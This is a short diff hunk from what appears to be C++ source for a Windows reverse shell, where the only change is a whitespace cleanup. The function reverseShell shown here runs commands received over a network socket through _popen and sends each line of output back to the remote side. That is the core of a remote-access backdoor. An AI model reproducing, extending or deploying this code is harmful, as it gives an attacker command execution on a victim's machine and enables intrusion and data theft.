@@ -48,7 +48,7 @@ void reverseShell(SOCKET clientSocket) {
         std::string result = std::string(buffer);
         _pclose(fp);
         fp = _popen(result.c_str(), "r");
-        
+
         // Sending back the result
         while (fgets(buffer, sizeof(buffer), fp) != NULL) {
             send(clientSocket, buffer, strlen(buffer), 0);
